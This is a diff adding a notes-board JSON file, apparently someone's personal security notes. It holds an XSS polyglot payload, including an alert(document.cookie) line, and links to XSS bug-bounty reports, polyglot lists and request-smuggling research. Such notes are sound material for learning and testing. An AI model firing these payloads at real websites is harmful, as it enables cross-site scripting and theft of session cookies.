@@ -1,0 +1,164 @@
+{
+	"cells": [
+		{
+			"blockId": "1e8f696e-15c3-40d0-9fa1-edf3a235438f",
+			"caption": "XSS script",
+			"data": {
+				"contents": "jaVasCript:/*-/*`/*\\`/*’/*”/**/(/* */oNcliCk=alert() )\r\n//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/ — !>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\r\n\r\n\">script>alert(document.cookie)</script>\r\n",
+				"file": "test.md",
+				"range": {
+					"end": {
+						"character": 2147483647,
+						"line": 6
+					},
+					"start": {
+						"character": 0,
+						"line": 3
+					}
+				},
+				"scm": {
+					"authors": [
+						{
+							"email": "av956797@gmail.com"
+						}
+					],
+					"branch": "master",
+					"file": "test.md",
+					"remotes": [
+						{
+							"name": "VS-Notes",
+							"url": "github.com/xr739j9m/vs-notes"
+						}
+					],
+					"repoName": "VS Notes",
+					"revision": "95065e09b9ca4c3c46b50efe1fcc563473699960",
+					"sameRepo": true
+				}
+			},
+			"id": "1e8f696e-15c3-40d0-9fa1-edf3a235438f",
+			"type": "code",
+			"version": 1
+		},
+		{
+			"blockId": "3c7d969c-330b-4c80-ab7f-a9eebb89708d",
+			"data": {
+				"formatCode": false,
+				"isPreviewing": true,
+				"text": "https://corneacristian.medium.com/top-25-xss-bug-bounty-reports-b3c90e2288c8"
+			},
+			"id": "3c7d969c-330b-4c80-ab7f-a9eebb89708d",
+			"type": "markdown"
+		},
+		{
+			"blockId": "28e8b575-9672-4cc2-ab3b-d8bfb4b3c914",
+			"data": {
+				"formatCode": false,
+				"isPreviewing": true,
+				"text": "https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/Polyglots/XSS-Polyglots.txt\n\nhttps://gist.github.com/michenriksen/d729cd67736d750b3551876bbedbe626\n\nhttps://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot\n"
+			},
+			"id": "28e8b575-9672-4cc2-ab3b-d8bfb4b3c914",
+			"type": "markdown"
+		},
+		{
+			"blockId": "017fd7bf-171d-4a8c-a079-09b0f25b2627",
+			"data": {
+				"formatCode": false,
+				"isPreviewing": true,
+				"text": "## Payloads:"
+			},
+			"id": "017fd7bf-171d-4a8c-a079-09b0f25b2627",
+			"type": "markdown"
+		},
+		{
+			"blockId": "028c44ec-2063-4a3a-a745-98e8d3ff1bba",
+			"data": {
+				"formatCode": false,
+				"isPreviewing": true,
+				"text": "https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn"
+			},
+			"id": "028c44ec-2063-4a3a-a745-98e8d3ff1bba",
+			"type": "markdown"
+		}
+	],
+	"graphViewMetadata": {
+		"edges": [
+			{
+				"id": "017fd7bf-171d-4a8c-a079-09b0f25b2627_bottom_28e8b575-9672-4cc2-ab3b-d8bfb4b3c914_left_M3nny6HQQjytIwBYhPN_GQ",
+				"source": "017fd7bf-171d-4a8c-a079-09b0f25b2627",
+				"sourceHandle": "bottom",
+				"target": "28e8b575-9672-4cc2-ab3b-d8bfb4b3c914",
+				"targetHandle": "left"
+			}
+		],
+		"graph": {
+			"position": [
+				-60.352623934032636,
+				-36.367633761475986
+			],
+			"zoom": 0.49999999999999994
+		},
+		"nodes": [
+			{
+				"blockId": "1e8f696e-15c3-40d0-9fa1-edf3a235438f",
+				"dimensions": {
+					"height": 177.0499496459961,
+					"width": 522
+				},
+				"id": "1e8f696e-15c3-40d0-9fa1-edf3a235438f",
+				"position": {
+					"x": 419.9999999999999,
+					"y": 165
+				}
+			},
+			{
+				"blockId": "3c7d969c-330b-4c80-ab7f-a9eebb89708d",
+				"dimensions": {
+					"height": 149,
+					"width": 326
+				},
+				"id": "3c7d969c-330b-4c80-ab7f-a9eebb89708d",
+				"position": {
+					"x": 510,
+					"y": -45
+				}
+			},
+			{
+				"blockId": "28e8b575-9672-4cc2-ab3b-d8bfb4b3c914",
+				"dimensions": {
+					"height": 253,
+					"width": 397
+				},
+				"id": "28e8b575-9672-4cc2-ab3b-d8bfb4b3c914",
+				"position": {
+					"x": 1575,
+					"y": -45
+				}
+			},
+			{
+				"blockId": "017fd7bf-171d-4a8c-a079-09b0f25b2627",
+				"dimensions": {
+				},
+				"id": "017fd7bf-171d-4a8c-a079-09b0f25b2627",
+				"position": {
+					"x": 1350,
+					"y": -270
+				}
+			},
+			{
+				"blockId": "028c44ec-2063-4a3a-a745-98e8d3ff1bba",
+				"dimensions": {
+					"height": 166,
+					"width": 398
+				},
+				"id": "028c44ec-2063-4a3a-a745-98e8d3ff1bba",
+				"position": {
+					"x": 1575,
+					"y": 240
+				}
+			}
+		]
+	},
+	"text": "",
+	"title": "Random",
+	"version": 1
+}
